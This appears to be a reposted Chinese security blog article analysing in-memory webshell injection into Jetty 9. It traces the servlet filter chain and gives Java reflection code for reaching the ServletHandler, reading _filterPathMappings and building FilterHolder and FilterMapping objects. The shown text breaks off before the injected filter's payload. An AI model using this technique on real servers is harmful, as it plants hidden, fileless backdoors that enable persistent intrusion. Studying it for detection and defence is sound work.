---
title: Jetty 内存马注入分析
url: https://buaq.net/go-149981.html
source: unSafe.sh - 不安全
date: 2023-02-19
fetch_date: 2025-10-04T07:29:29.158481
---

# Jetty 内存马注入分析

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/8945933a11c4d7eec922595aa4530330.jpg)

Jetty 内存马注入分析

目录环境搭建Filter分析构造内存马获取ServletHandler获取\_filterPathMappings实例化FilterMapping
*2023-2-18 12:25:0
Author: [xz.aliyun.com(查看原文)](/jump-149981.htm)
阅读量:35
收藏*

---

## 目录

* [环境搭建](#环境搭建)
* [Filter分析](#Filter分析)
* [构造内存马](#构造内存马)
  + [获取ServletHandler](#获取ServletHandler)
  + [获取\_filterPathMappings](#获取_filterPathMappings)
  + [实例化FilterMapping](#实例化FilterMapping)
* [具体实现](#具体实现)
* [后记](#后记)

### 环境搭建

Jetty 是一个开源的servlet容器，它为基于Java的web容器，例如JSP和servlet提供运行环境。Jetty是使用Java语言编写的，它的API以一组JAR包的形式发布。开发人员可以将Jetty容器实例化成一个对象，可以迅速为一些独立运行（stand-alone）的Java应用提供网络和web连接。

Jetty 9.0.7

HelloFilter

```
package com.example.JettyDemo;

import javax.servlet.*;
import javax.servlet.annotation.*;
import java.io.IOException;

@WebFilter(filterName = "HelloFilter",urlPatterns = "/hello")
public class HelloFilter implements Filter {
    public void init(FilterConfig config) throws ServletException {
    }

    public void destroy() {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
        response.getWriter().println("HelloFilter work");
        chain.doFilter(request, response);
    }
}
```

### Filter分析

在servlet打下断点，查看调用栈，在ServletHandler中第一次出现了和filter相关的信息，可以看出调用栈在经ServletHandler后构造filter相关的信息。个人理解，直接寻找第一出现和filtes相关信息的调用栈，可以快速定位获取上下文的内容。比如这里，就看出我们需要获取ServletHanlder。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221518-81771d10-aecd-1.png)

找到第一次调用`doFilter`的地方，`ServletHandler::doHandle`中第一次调用了doFilter，`chain.doFilter()`。考虑chain是如何生成的。
![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221529-88344f1a-aecd-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221542-9022f442-aecd-1.png)

`ServletHandler::doHandle`中定义了`chain（FilterChain）类型`，接着调用了`getFilterChain`，跟进查看`getFilterChain`，该函数构造FilterChain。
![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221558-99a0c684-aecd-1.png)

在该函数中打下断点，跟进到该函数中，重启服务器。这里实例化了一个filters，接下来的操作就是遍历`_filterPathMappings`中的元素，从中获取元素中的`_Holder`（FilterHolder类型）
![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221612-a213e0ee-aecd-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221626-aa3b9df2-aecd-1.png)

接着经过`new ServletHandler.CacheChain(filers,servletHolder)`，会将filters中的信息存入chain，然后返回chain。
![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221655-bb3609f8-aecd-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221719-c9cecd60-aecd-1.png)

继续往上跟进，观察`_filterPathMappings`如何生成的。观察调用栈可以发现，在第一次调用`ServletHandler`的时候，在实例化的`ServletHandler`对象中有`this._filterPathMappings`，那么可以理解为获取到`ServletHandler对象`就能获取到`_filterPathMappings`
![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221735-d3773f00-aecd-1.png)

所以如何将恶意filter注入的关键在于在`_filterPathMappings`中添加必要的元素。需要往filerPathMappings中添加FilterMapping类型的元素。根据经验，可以假设FilterMapping中需要包含如下三个变量。
![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221758-e0bd493e-aecd-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221814-ead68f8e-aecd-1.png)

思路如下：

```
1、获取ServletHandler
2、获取_filterPathMappings
3、往_filterPathMappings中添加元素FilterMapping的实例化对象
其中该实例化对象包含三个变量：分别是_filterName,_holder,_pathSpecs
```

### 构造内存马

#### 获取ServletHandler

快速定位上下文

```
// 设置搜索类型包含Request关键字的对象
java.util.List<me.gv7.tools.josearcher.entity.Keyword> keys = new ArrayList<Keyword>();
keys.add(new me.gv7.tools.josearcher.entity.Keyword.Builder().setField_type("org.eclipse.jetty.servlet.ServletHandler.").build());
// 定义黑名单
java.util.List<me.gv7.tools.josearcher.entity.Blacklist> blacklists = new ArrayList<Blacklist>();
blacklists.add(new me.gv7.tools.josearcher.entity.Blacklist.Builder().setField_type("java.io.File").build());
// 新建一个广度优先搜索Thread.currentThread()的搜索器
me.gv7.tools.josearcher.searcher.SearchRequstByBFS searcher = new me.gv7.tools.josearcher.searcher.SearchRequstByBFS(Thread.getThreads(),keys);
// 设置黑名单
searcher.setBlacklists(blacklists);
// 打开调试模式,会生成log日志
searcher.setIs_debug(true);
// 挖掘深度为20
searcher.setMax_search_depth(20);
// 设置报告保存位置
searcher.setReport_save_path("/Users/lishuheng/Documents/CodeFile/java/MiddleWare/logs/jetty");
searcher.searchObject();
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221856-034a38e0-aece-1.png)

```
TargetObject = {[Ljava.lang.Thread;}
   ---> [8] = {java.lang.Thread} = {java.lang.Thread}
    ---> contextClassLoader = {org.eclipse.jetty.webapp.WebAppClassLoader}
     ---> _context = {org.eclipse.jetty.webapp.WebAppContext}
             ---> _servletHandler = {org.eclipse.jetty.servlet.ServletHandler}
```

获取\_servletHandler

```
Object obj = Thread.currentThread();
Field field = obj.getClass().getDeclaredField("contextClassLoader");
field.setAccessible(true);
obj = field.get(obj);

field = obj.getClass().getDeclaredField("_context");
field.setAccessible(true);
obj = field.get(obj);

field = obj.getClass().getSuperclass().getDeclaredField("_servletHandler");
field.setAccessible(true);
obj = field.get(obj);
```

#### 获取\_filterPathMappings

```
private static synchronized void InjectFilter(){
    ...
       //假定已经获取到ServletHandler
       ArrayList filterPathMappings = (ArrayList) GetField(servletHandler,"_filterPathMappings");
    ...
    }

    private static synchronized Object GetField(Object o, String k) throws Exception{
        Field f;
        try {
            f = o.getClass().getDeclaredField(k);
        } catch (NoSuchFieldException e) {
            try{
                f = o.getClass().getSuperclass().getDeclaredField(k);
            }catch (Exception e1){
                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);
            }
        }
        f.setAccessible(true);
        return f.get(o);
    }
```

#### 实例化FilterMapping

这里需要注意的是，当我企图直接实例化一个FilterMapping的时候，系统报错如下：
![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221918-108365cc-aece-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230217221942-1eb5376a-aece-1.png)

但是在Jetty的依赖包中又确实有这个类。暂时存疑。
![](https://xzfile.aliyuncs.com/media/upload/picture/20230217222005-2cdd4bac-aece-1.png)

这里提供两种解决思路

**思路一：**

干脆直接用反射的方式去构造FilterMapping，如下：

```
Constructor constructor2 = servletHandler.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterHolder").getDeclaredConstructor();
            constructor2.setAccessible(true);
            Object filterHolder = constructor2.newInstance();

            Method setFilter = filterHolder.getClass().getDeclaredMethod("setFilter",Filter.class);
            setFilter.invoke(filterHolder,HFilter);

            Method setName = filterHolder.getClass().getSuperclass().getDeclaredMethod("setName",String.class);
            setName.invoke(filterHolder,filterName);

            Constructor constructor = servletHandler.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterMapping").getDeclaredConstructor();
            constructor.setAccessible(true);
            Object filterMapping = constructor.newInstance();
```

实例化FilterMapping对象包含三个变量，分别是`_filterName,_holder,_pathSpecs`的原因是

`_pathSpecs`在`ServletHandler:getFilterChain()`中的`appliesTo()`函数
![](https://xzfile.aliyuncs.com/media/upload/picture/20230217222038-403cb3e0-aece-1.png)

该函数将实际访问的路由与`filterMapping._pathSpecs`中所定义的路由进行匹配，匹配正确则为true。
![](https://xzfile.aliyuncs.com/media/upload/picture/20230217222102-4ef7bdb2-aece-1.png)

接着调用`filterPathMapping.getFilterHolder()`，获取`filterMapping`中的`_holder`，
![](https://xzfile.aliyuncs.com/media/upload/picture/20230217222120-592112a2-aece-1.p...